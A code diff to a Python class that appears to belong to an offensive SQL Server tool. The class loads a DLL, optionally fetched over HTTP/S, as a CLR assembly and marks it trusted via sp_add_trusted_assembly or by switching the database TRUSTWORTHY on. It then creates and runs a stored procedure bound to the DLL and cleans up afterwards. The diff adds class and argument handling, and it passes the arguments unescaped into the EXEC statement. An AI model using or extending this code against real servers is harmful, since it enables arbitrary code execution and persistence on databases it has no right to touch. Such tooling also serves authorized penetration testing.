@@ -40,19 +40,22 @@ class ClrExecution(BaseAction):
     6. Cleanup (drop procedure, assembly, and hash)
     """
 
-
     def __init__(self):
         super().__init__()
         self._dll_uri: str = ""
+        self._class_name: str = "StoredProcedures"
         self._function: str = "Main"
+        self._args: str = ""
 
-    def validate_arguments(self, additional_arguments: str = "", argument_list=None) -> None:
+    def validate_arguments(
+        self, additional_arguments: str = "", argument_list=None
+    ) -> None:
         """
         Validate arguments for CLR execution.
 
         Args:
             additional_arguments: The argument string to parse
-                Format: <dll_uri> [function]
+                Format: <dll_uri> <class_name> <function> [args...]
 
         Raises:
             ValueError: If arguments are invalid
@@ -63,19 +66,40 @@ class ClrExecution(BaseAction):
         if len(positional_args) >= 1:
             self._dll_uri = positional_args[0]
         else:
-            raise ValueError("DLL URI is required. Usage: <dllURI> [function]")
+            raise ValueError(
+                "DLL URI is required. Usage: <dllURI> <className> <function> [args...]"
+            )
 
-        # Parse function name (optional, default: Main)
+        # Parse class name (required)
         if len(positional_args) >= 2:
-            self._function = positional_args[1] if positional_args[1] else "Main"
+            self._class_name = positional_args[1]
         else:
-            self._function = "Main"
+            raise ValueError(
+                "Class name is required. Usage: <dllURI> <className> <function> [args...]"
+            )
+
+        # Parse function name (required)
+        if len(positional_args) >= 3:
+            self._function = positional_args[2]
+        else:
+            raise ValueError(
+                "Function name is required. Usage: <dllURI> <className> <function> [args...]"
+            )
+
+        # Parse remaining args (optional, joined with space)
+        if len(positional_args) >= 4:
+            self._args = " ".join(positional_args[3:])
 
         if not self._dll_uri:
-            raise ValueError("DLL URI is required. Usage: <dllURI> [function]")
+            raise ValueError(
+                "DLL URI is required. Usage: <dllURI> <className> <function> [args...]"
+            )
 
         logger.info(f"DLL URI: {self._dll_uri}")
+        logger.info(f"Class: {self._class_name}")
         logger.info(f"Function: {self._function}")
+        if self._args:
+            logger.info(f"Args: {self._args}")
 
     def execute(self, database_context: DatabaseContext) -> bool:
         """
@@ -108,20 +132,49 @@ class ClrExecution(BaseAction):
         drop_procedure = f"DROP PROCEDURE IF EXISTS [{self._function}];"
         drop_assembly = f"DROP ASSEMBLY IF EXISTS [{assembly_name}];"
         drop_clr_hash = f"EXEC sp_drop_trusted_assembly 0x{library_hash};"
+        used_trusted_assembly = False
+        set_trustworthy = False
 
         logger.info("Starting CLR assembly deployment process")
 
         try:
-            if database_context.server.legacy:
-                logger.info("Legacy server detected. Enabling TRUSTWORTHY property")
-                database_context.query_service.execute_non_processing(
-                    f"ALTER DATABASE [{database_context.query_service.execution_database}] SET TRUSTWORTHY ON;"
+            # Strategy 1: Try sp_add_trusted_assembly (SQL 2017+)
+            # Strategy 2: Fall back to TRUSTWORTHY property
+            if not database_context.server.legacy:
+                used_trusted_assembly = (
+                    database_context.config_service.register_trusted_assembly(
+                        library_hash, library_path
+                    )
                 )
 
-            if not database_context.config_service.register_trusted_assembly(
-                library_hash, library_path
-            ):
-                return False
+            if not used_trusted_assembly:
+                logger.warning(
+                    "Trusted assembly registration unavailable, falling back to TRUSTWORTHY"
+                )
+                trustworthy_result = database_context.query_service.execute_scalar(
+                    "SELECT is_trustworthy_on FROM sys.databases WHERE name = DB_NAME();"
+                )
+                is_trustworthy = trustworthy_result is not None and bool(
+                    int(trustworthy_result)
+                )
+
+                if not is_trustworthy:
+                    logger.warning(
+                        "Current database is not TRUSTWORTHY, attempting to enable it"
+                    )
+                    try:
+                        database_context.query_service.execute_non_processing(
+                            f"ALTER DATABASE [{database_context.query_service.execution_database}] SET TRUSTWORTHY ON;"
+                        )
+                        set_trustworthy = True
+                        logger.success("TRUSTWORTHY enabled on current database")
+                    except Exception as ex:
+                        logger.error(f"Failed to enable TRUSTWORTHY: {ex}")
+                        return False
+                else:
+                    logger.info(
+                        "Database is already TRUSTWORTHY, using it for CLR deployment"
+                    )
 
             # Drop existing procedure and assembly if they exist
             database_context.query_service.execute_non_processing(drop_procedure)
@@ -142,7 +195,7 @@ class ClrExecution(BaseAction):
             # Step 4: Create the stored procedure linked to the assembly
             logger.info("Creating the stored procedure linked to the assembly")
             database_context.query_service.execute_non_processing(
-                f"CREATE PROCEDURE [dbo].[{self._function}] AS EXTERNAL NAME [{assembly_name}].[StoredProcedures].[{self._function}];"
+                f"CREATE PROCEDURE [dbo].[{self._function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assembly_name}].[{self._class_name}].[{self._function}];"
             )
 
             if not database_context.config_service.check_procedure(self._function):
@@ -154,7 +207,7 @@ class ClrExecution(BaseAction):
             # Step 5: Execute the stored procedure
             logger.info(f"Executing the stored procedure '{self._function}'")
             database_context.query_service.execute_non_processing(
-                f"EXEC {self._function};"
+                f"EXEC [{self._function}] @args = '{self._args}';"
             )
             logger.success("Stored procedure executed successfully")
 
@@ -169,9 +222,11 @@ class ClrExecution(BaseAction):
             logger.info("Performing cleanup")
             database_context.query_service.execute_non_processing(drop_procedure)
             database_context.query_service.execute_non_processing(drop_assembly)
-            database_context.query_service.execute_non_processing(drop_clr_hash)
 
-            if database_context.server.legacy:
+            if used_trusted_assembly:
+                database_context.query_service.execute_non_processing(drop_clr_hash)
+
+            if set_trustworthy:
                 logger.info("Resetting TRUSTWORTHY property")
                 database_context.query_service.execute_non_processing(
                     f"ALTER DATABASE [{database_context.query_service.execution_database}] SET TRUSTWORTHY OFF;"
@@ -186,7 +241,9 @@ class ClrExecution(BaseAction):
         """
         return [
             "DLL URI (local path or HTTP/S URL)",
-            "Function name to execute (default: Main)",
+            "Class name containing the function",
+            "Function name to execute",
+            "Function args (optional)",
         ]
 
     def _convert_dll_to_sql_bytes(self, dll: str) -> tuple[str, str]:
